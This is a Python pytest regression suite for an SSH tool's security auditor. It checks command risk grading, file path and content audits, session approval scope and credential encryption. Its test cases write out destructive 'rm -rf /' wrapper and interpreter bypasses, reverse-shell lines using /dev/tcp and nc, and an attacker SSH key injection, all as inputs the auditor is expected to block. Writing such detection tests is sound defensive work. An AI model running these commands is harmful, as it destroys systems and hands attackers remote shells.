"""
P0 安全漏洞修复回归测试集 (P0 Security Vulnerability Regression Tests)
涵盖：
1. AST 审计器包装命令解包与解释器 -c 递归审计 (Prefix wrapping & interpreter payload audit)
3. 文件通道敏感路径、读审计、写审计与内容提权/反弹Shell拦截 (File channel security & content audit)
4. scope=session 审批范围精准收敛至具体指令 (Strict exact-command session approval)
5. 凭据加解密持久化、passphrase 保存与 SSH 主机密钥校验 (Credential encryption & SSH host key verification)
"""

import os
import shlex
import pytest
from unittest.mock import MagicMock

from adapter.security.auditor import BashlexCommandAuditor
from adapter.security.crypto import encrypt_credential, decrypt_credential
from adapter.ssh.asyncssh_gateway import AsyncSSHGateway
from adapter.repository.database import get_db_session
from adapter.repository.models import SSHConnectionPO
from adapter.repository import SQLAlchemySSHConnectionRepository
from application.ports import ISSHGateway
from application.react.managers import InMemoryApprovalManager
from domain.policies.file_access import audit_file_content_security, audit_file_path_security
from domain.entities import (
    AuthType,
    Command,
    ExecutionResult,
    RiskLevel,
    SSHConnection,
    SSHConnectionConfig,
)
from sqlalchemy import select


# ====================================================================
# 1. AST 审计器包装命令解包与解释器 -c 载荷审计
# ====================================================================

@pytest.mark.asyncio
async def test_ast_auditor_known_bypass_matrix():
    """验证包装器、解释器载荷与长选项绕过均被审计器正确拦截或升级"""
    auditor = BashlexCommandAuditor()

    cases = [
        # 前缀包装命令
        ("sudo rm -rf /", RiskLevel.FORBIDDEN),
        ("nohup rm -rf /", RiskLevel.FORBIDDEN),
        ("timeout 10 rm -rf /", RiskLevel.FORBIDDEN),
        ("env FOO=1 BAR=2 rm -rf /", RiskLevel.FORBIDDEN),
        ("sudo -u root -s rm -rf /", RiskLevel.FORBIDDEN),
        ("timeout 10 env VAR=1 sudo rm -rf /", RiskLevel.FORBIDDEN),
        ("sudo systemctl restart nginx", RiskLevel.HIGH_RISK),
        ("nohup service docker restart", RiskLevel.HIGH_RISK),
        ("sudo systemctl status nginx", RiskLevel.HIGH_RISK),
        ("sudo ls -la /var/log", RiskLevel.SAFE),
        ("nohup df -h", RiskLevel.SAFE),
        # Shell / Python / Perl 解释器载荷
        ('bash -c "rm -rf /"', RiskLevel.FORBIDDEN),
        ('sh -c "rm -rf /"', RiskLevel.FORBIDDEN),
        ('sudo bash -c "rm -rf /data"', RiskLevel.HIGH_RISK),
        ('bash -c "cat /etc/passwd"', RiskLevel.SAFE),
        ('python3 -c "import shutil; shutil.rmtree(\'/\')"', RiskLevel.FORBIDDEN),
        ('python -c "import os; os.remove(\'/etc/shadow\')"', RiskLevel.HIGH_RISK),
        ('python3 -c "print(1+1)"', RiskLevel.SAFE),
        ('perl -e "unlink \'/etc/passwd\'"', RiskLevel.HIGH_RISK),
        # 其他包装器 / 逃逸场景 / 长选项
        ("command rm -rf /", RiskLevel.FORBIDDEN),
        ("ionice -c3 rm -rf /", RiskLevel.FORBIDDEN),
        ("su - root -c 'rm -rf /'", RiskLevel.FORBIDDEN),
        ("eval 'rm -rf /'", RiskLevel.FORBIDDEN),
        ("echo 'rm -rf /' | bash", RiskLevel.FORBIDDEN),
        ('bash -c \'eval "rm -rf /"\'', RiskLevel.FORBIDDEN),
        ("find /tmp -exec rm -rf {} +", RiskLevel.HIGH_RISK),
        ("busybox rm -rf /", RiskLevel.FORBIDDEN),
        ("watch -n1 rm -rf /", RiskLevel.FORBIDDEN),
        ("setsid rm -rf /", RiskLevel.FORBIDDEN),
        ("flock /tmp/lock rm -rf /", RiskLevel.FORBIDDEN),
        ('awk \'BEGIN{system("rm -rf /")}\'', RiskLevel.FORBIDDEN),
        ('ruby -e \'FileUtils.rm_rf("/")\'', RiskLevel.FORBIDDEN),
        ('node -e \'require("fs").rmSync("/",{recursive:true})\'', RiskLevel.FORBIDDEN),
        ('php -r \'system("rm -rf /");\'', RiskLevel.FORBIDDEN),
        ('python3 -c "import os; os.system(\'rm -rf /\')"', RiskLevel.FORBIDDEN),
        ('python3 -c "import subprocess; subprocess.run([\'rm\',\'-rf\',\'/\'])"', RiskLevel.FORBIDDEN),
        ("sudo --user root rm -rf /", RiskLevel.FORBIDDEN),
        ("env --unset FOO rm -rf /", RiskLevel.FORBIDDEN),
        ("xargs --max-args 1 rm -rf /", RiskLevel.FORBIDDEN),
        ("nice --adjustment 5 rm -rf /", RiskLevel.FORBIDDEN),
    ]

    for raw_cmd, expected_risk in cases:
        decision = await auditor.audit(Command(raw_command=raw_cmd))
        assert decision.risk_level == expected_risk, (
            f"Failed on command '{raw_cmd}': got {decision.risk_level}, expected {expected_risk}"
        )


# ====================================================================
# 3. 文件通道安全：读/写敏感路径审计、写入内容反弹Shell检测与命令注入防护
# ====================================================================

def test_file_path_security_matrix():
    """验证读/写敏感路径、持久化后门路径与安全业务路径的统一审计结果"""
    cases = [
        # 读敏感凭据 / 私钥
        ("/root/.ssh/id_rsa", False, RiskLevel.HIGH_RISK),
        ("~/.ssh/id_rsa", False, RiskLevel.HIGH_RISK),
        ("/home/ubuntu/.ssh/id_ed25519", False, RiskLevel.HIGH_RISK),
        ("/etc/shadow", False, RiskLevel.HIGH_RISK),
        ("/etc/ssh/ssh_host_rsa_key", False, RiskLevel.HIGH_RISK),
        ("/etc/ssh/ssh_host_ed25519_key", False, RiskLevel.HIGH_RISK),
        # 读普通日志 / 配置
        ("/var/log/syslog", False, RiskLevel.SAFE),
        ("/etc/hosts", False, RiskLevel.SAFE),
        # 写入持久化后门路径
        ("~/.ssh/authorized_keys", True, RiskLevel.HIGH_RISK),
        ("/home/user/.bashrc", True, RiskLevel.HIGH_RISK),
        ("/home/user/.profile", True, RiskLevel.HIGH_RISK),
        ("/var/spool/cron/root", True, RiskLevel.HIGH_RISK),
        ("/etc/cron.d/backdoor", True, RiskLevel.HIGH_RISK),
        ("/etc/rc.local", True, RiskLevel.HIGH_RISK),
        ("/etc/modprobe.d/backdoor.conf", True, RiskLevel.HIGH_RISK),
        # 写入绝对禁止路径
        ("/etc/ld.so.preload", True, RiskLevel.FORBIDDEN),
        # 安全业务路径
        ("/etc/nginx/nginx.conf", True, RiskLevel.SAFE),
        ("/home/admin/app/settings.py", True, RiskLevel.SAFE),
    ]

    for path, is_write, expected_risk in cases:
        decision = audit_file_path_security(path, is_write=is_write)
        assert decision.risk_level == expected_risk, (
            f"Failed on path '{path}' (is_write={is_write}): got {decision.risk_level}, expected {expected_risk}"
        )


def test_file_content_security():
    """验证写入内容深度审计：反弹 Shell 拦截与 SSH 公钥写入审计"""
    # 反弹 Shell 内容直接判 FORBIDDEN
    rev_shell = "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    decision = audit_file_content_security(rev_shell)
    assert decision is not None
    assert decision.risk_level == RiskLevel.FORBIDDEN

    nc_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"
    decision_nc = audit_file_content_security(nc_shell)
    assert decision_nc is not None
    assert decision_nc.risk_level == RiskLevel.FORBIDDEN

    # 写入 authorized_keys 注入公钥判 HIGH_RISK
    pub_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0123456789 test@attacker"
    decision_key = audit_file_content_security(pub_key)
    assert decision_key is not None
    assert decision_key.risk_level == RiskLevel.HIGH_RISK

    # 正常内容放行 (返回 None 说明无风险)
    normal_conf = "server {\n    listen 80;\n    server_name example.com;\n}\n"
    decision_safe = audit_file_content_security(normal_conf)
    assert decision_safe is None


def test_file_channel_high_risk_path_with_forbidden_content():
    """验证当路径是 HIGH_RISK (如 .bashrc) 时，写入反弹 Shell 依然必须被判定为 FORBIDDEN"""
    path = "/home/user/.bashrc"
    content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    path_decision = audit_file_path_security(path, is_write=True)
    assert path_decision.risk_level == RiskLevel.HIGH_RISK

    content_decision = audit_file_content_security(content)
    assert content_decision is not None
    assert content_decision.risk_level == RiskLevel.FORBIDDEN

    # 模拟合并逻辑
    decisions = [path_decision, content_decision]
    merged_risk = RiskLevel.FORBIDDEN if any(d.risk_level == RiskLevel.FORBIDDEN for d in decisions) else RiskLevel.HIGH_RISK
    assert merged_risk == RiskLevel.FORBIDDEN


# ====================================================================
# 4. scope=session 审批精准度
# ====================================================================

@pytest.mark.asyncio
async def test_session_approval_scope_precision():
    """验证 scope=session 仅放行完全匹配的具体命令，绝不泛化至 base_cmd"""
    mgr = InMemoryApprovalManager()
    session_id = "test-session-scope-01"

    # 注册一个 kill 审批请求
    appr_id = mgr.create_approval_request(
        session_id=session_id,
        step_idx=1,
        command="kill -9 12345",
        reason="终止特定僵尸进程",
    )

    # 提交决策：session 范围同意
    res = mgr.submit_decision(
        approval_id=appr_id,
        approved=True,
        scope="session",
    )
    assert res is True

    # 1. 相同的命令在当前 session 中自动通过
    assert mgr.is_session_approved(session_id, "kill -9 12345") is True

    # 2. 其他 kill 命令绝对不能免审！
    assert mgr.is_session_approved(session_id, "kill -9 1") is False
    assert mgr.is_session_approved(session_id, "kill -9 99999") is False
    assert mgr.is_session_approved(session_id, "kill 12345") is False

    # 3. 其他高危命令更加不能免审
    assert mgr.is_session_approved(session_id, "systemctl restart docker") is False
    assert mgr.is_session_approved(session_id, "rm -rf /tmp/data") is False

    # 4. 换一个 session 也必须不生效
    assert mgr.is_session_approved("other-session", "kill -9 12345") is False


# ====================================================================
# 5. 凭据加解密持久化、passphrase 保存与 SSH 主机密钥校验
# ====================================================================

def test_credential_encryption_and_backward_compatibility():
    """验证凭据加密机制及其对历史明文的平滑向下兼容"""
    plain = "SuperSecretPassword123!"

    # 加密
    encrypted = encrypt_credential(plain)
    assert encrypted is not None
    assert encrypted != plain
    assert encrypted.startswith("gAAAAA")

    # 解密
    decrypted = decrypt_credential(encrypted)
    assert decrypted == plain

    # 历史未加密明文兼容
    legacy_plain = "OldPlainTextPassword"
    assert decrypt_credential(legacy_plain) == legacy_plain


@pytest.mark.asyncio
async def test_repository_credential_encryption_and_passphrase_persistence():
    """验证保存主机凭据时密文落库、passphrase 持久化以及读取时正确解密"""
    async for session in get_db_session():
        repo = SQLAlchemySSHConnectionRepository(session)

        conn_id = "test-cred-host-999"
        test_host = SSHConnection(
            connection_id=conn_id,
            connection_name="secure-host",
            host="10.0.0.88",
            port=22,
            username="devops",
            auth_type=AuthType.PRIVATE_KEY,
            password="host_login_password",
            private_key="-----BEGIN OPENSSH PRIVATE KEY-----\nfakekey\n-----END OPENSSH PRIVATE KEY-----",
            passphrase="my_private_key_passphrase",
            config=SSHConnectionConfig(
                strict_host_key_check=True,
                known_hosts="/etc/ssh/ssh_known_hosts",
            )
        )

        saved = await repo.save(test_host)
        assert saved.connection_id == conn_id
        assert saved.password == "host_login_password"
        assert saved.passphrase == "my_private_key_passphrase"

        # 验证数据库直接查出来的 PO 中是密文
        stmt = select(SSHConnectionPO).where(SSHConnectionPO.connection_id == conn_id)
        result = await session.execute(stmt)
        po = result.scalars().first()

        assert po is not None
        assert po.encrypted == 1
        assert po.password.startswith("gAAAAA")
        assert po.private_key.startswith("gAAAAA")
        assert po.passphrase.startswith("gAAAAA")

        # 验证通过仓库按 ID 读取时自动解密
        loaded = await repo.get_by_id(conn_id)
        assert loaded is not None
        assert loaded.password == "host_login_password"
        assert loaded.private_key.startswith("-----BEGIN OPENSSH PRIVATE KEY-----")
        assert loaded.passphrase == "my_private_key_passphrase"
        assert loaded.config is not None
        assert loaded.config.strict_host_key_check == 1
        assert loaded.config.known_hosts == "/etc/ssh/ssh_known_hosts"


def test_asyncssh_gateway_known_hosts_verification():
    """验证 AsyncSSHGateway 连接参数中 known_hosts 的实用防御策略"""
    gateway = AsyncSSHGateway()

    # 1. 默认配置下无 known_hosts：默认 strict_host_key_check=0，known_hosts=None，避免存量主机断连
    host_default = SSHConnection(
        connection_id="host-1",
        connection_name="host-default",
        host="1.2.3.4",
        username="root",
        auth_type=AuthType.PASSWORD,
        password="pwd",
    )
    opts_default = gateway._prepare_connection_options(host_default)
    assert opts_default["known_hosts"] is None

    # 2. 显式指定自定义 known_hosts 路径
    host_custom = SSHConnection(
        connection_id="host-2",
        connection_name="host-custom",
        host="1.2.3.4",
        username="root",
        auth_type=AuthType.PASSWORD,
        password="pwd",
        config=SSHConnectionConfig(
            strict_host_key_check=1,
            known_hosts="/etc/ssh/ssh_known_hosts",
        ),
    )
    opts_custom = gateway._prepare_connection_options(host_custom)
    assert opts_custom["known_hosts"] == "/etc/ssh/ssh_known_hosts"

    # 3. 显式开启 strict=1 但未配文件时：绝不可传入空元组 () 导致全部拒绝
    host_strict_no_file = SSHConnection(
        connection_id="host-3",
        connection_name="host-strict",
        host="1.2.3.4",
        username="root",
        auth_type=AuthType.PASSWORD,
        password="pwd",
        config=SSHConnectionConfig(
            strict_host_key_check=1,
            known_hosts=None,
        ),
    )
    opts_strict = gateway._prepare_connection_options(host_strict_no_file)
    assert opts_strict["known_hosts"] != ()


def test_crypto_fail_secure_on_error(monkeypatch):
    """验证 encrypt_credential 异常时坚决抛出错误，杜绝明文静默落库且被标记为 encrypted=1"""
    from adapter.security import crypto
    
    # 模拟加密对象抛异常
    class BrokenFernet:
        def encrypt(self, data):
            raise Exception("KMS unavailable")
    
    monkeypatch.setattr(crypto, "get_fernet", lambda: BrokenFernet())
    with pytest.raises(RuntimeError, match="Credential encryption failure"):
        crypto.encrypt_credential("SecretPassword123!")
